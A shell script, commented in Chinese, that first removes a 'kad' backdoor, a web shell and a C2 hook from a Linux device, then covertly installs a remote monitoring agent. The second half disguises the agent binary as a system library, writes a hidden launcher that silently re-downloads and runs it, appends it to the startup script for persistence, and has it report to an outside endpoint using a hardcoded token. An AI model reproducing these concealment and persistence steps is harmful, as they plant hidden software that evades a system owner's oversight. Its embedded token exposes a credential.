#!/bin/sh
#
# cleanup_and_install.sh - 清除后门 + 隐蔽安装 Agent
#

# ============ 配置 ============
DOWNLOAD_URL="https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm"
INSTALL_PATH="/usr/lib/libsystemd-helper.so"
HIDDEN_SCRIPT="/usr/lib/.sysd"
ENDPOINT="http://status.sm.uy"
TOKEN="yrushkwQRMduYX7lU2eYyxa3"
STARTUP_SCRIPT="/spider/sicu/start.sh"
# ==============================

echo "=========================================="
echo "   清除后门 + 安装 Agent 一键脚本"
echo "=========================================="

# 检查 root
if [ "$(id -u)" != "0" ]; then
    echo "[错误] 请使用 root 权限运行"
    exit 1
fi

# ========== 第一部分：清除 kad 后门 ==========
echo ""
echo ">>>>>>>>>> 第一部分: 清除 kad 后门 <<<<<<<<<<"

echo "[1/6] 终止 kad 进程..."
killall -9 kad 2>/dev/null
pkill -9 -f "kad" 2>/dev/null
sleep 1
ps | grep -v grep | grep -q "kad" && echo "  [警告] 仍有 kad 进程" || echo "  [完成]"

echo "[2/6] 删除恶意文件..."
rm -f /tmp/kad /tmp/deploy.sh /tmp/kQC6LuM7Ce
rm -f /spider/web/webroot/GR0qkVGY.txt /spider/web/webroot/XOP7rndT.txt
rm -f /spider/web/webroot/x.php
echo "  [完成]"

echo "[3/6] 搜索可疑文件..."
find /tmp -name "kad*" -type f 2>/dev/null -exec rm -f {} \;
echo "  [完成]"

echo "[4/6] 清除 spider-monitor 后门..."
MONITOR_FILE="/spider/sicu/spider-monitor"
if [ -f "$MONITOR_FILE" ]; then
    cp "$MONITOR_FILE" "${MONITOR_FILE}.bak.$(date +%Y%m%d%H%M%S)"
    sed -i '/PING=`date +"%-M"`/,/#KtL6dazS8M43/d' "$MONITOR_FILE"
    grep -q "216.146.25.201" "$MONITOR_FILE" && echo "  [警告] 请手动检查" || echo "  [完成]"
else
    echo "  [跳过]"
fi

echo "[5/6] 阻止 C2 服务器..."
command -v iptables >/dev/null 2>&1 && iptables -A OUTPUT -d 216.146.25.201 -j DROP 2>/dev/null && echo "  [完成]" || echo "  [跳过]"

echo "[6/6] 验证..."
ps | grep -v grep | grep -q "kad" && echo "  [警告] 残留进程" || echo "  [正常]"

# ========== 第二部分：隐蔽安装 Agent ==========
echo ""
echo ">>>>>>>>>> 第二部分: 隐蔽安装 Agent <<<<<<<<<<"

echo "[1/5] 下载 agent..."
if [ -f "$INSTALL_PATH" ]; then
    echo "  已存在，跳过"
else
    wget -q "$DOWNLOAD_URL" -O "$INSTALL_PATH" && chmod +x "$INSTALL_PATH" && echo "  [完成]" || { echo "  [失败]"; exit 1; }
fi

echo "[2/5] 创建隐藏启动脚本..."
cat > "$HIDDEN_SCRIPT" << EOF
#!/bin/sh
B="$INSTALL_PATH"
U="$DOWNLOAD_URL"
[ ! -f "\$B" ] && wget -q "\$U" -O "\$B" && chmod +x "\$B"
"\$B" -e $ENDPOINT --auto-discovery "$TOKEN" -u > /dev/null 2>&1 &
EOF
chmod +x "$HIDDEN_SCRIPT"
echo "  [完成] $HIDDEN_SCRIPT"

echo "[3/5] 清理旧启动项..."
sed -i '/System Helper/d' "$STARTUP_SCRIPT" 2>/dev/null
sed -i '/libsystemd-helper/d' "$STARTUP_SCRIPT" 2>/dev/null
sed -i '/\.sysd/d' "$STARTUP_SCRIPT" 2>/dev/null
echo "  [完成]"

echo "[4/5] 添加开机启动..."
if grep -q "\.sysd" "$STARTUP_SCRIPT" 2>/dev/null; then
    echo "  已存在，跳过"
else
    echo "$HIDDEN_SCRIPT" >> "$STARTUP_SCRIPT"
    echo "  [完成]"
fi

echo "[5/5] 启动 agent..."
pkill -f libsystemd-helper 2>/dev/null
sleep 1
"$INSTALL_PATH" -e "$ENDPOINT" --auto-discovery "$TOKEN" -u > /dev/null 2>&1 &
sleep 2
ps | grep -v grep | grep -q "libsystemd-helper" && echo "  [完成] 进程已启动" || echo "  [警告] 启动失败"

# ========== 完成 ==========
echo ""
echo "=========================================="
echo "   全部完成！"
echo "=========================================="
echo ""
echo "隐藏脚本: $HIDDEN_SCRIPT"
echo "Agent: $INSTALL_PATH"  
echo "start.sh 中只添加了一行: $HIDDEN_SCRIPT"
echo ""
echo "验证:"
tail -3 "$STARTUP_SCRIPT"
echo ""
ps | grep -v grep | grep libsystemd-helper
echo ""
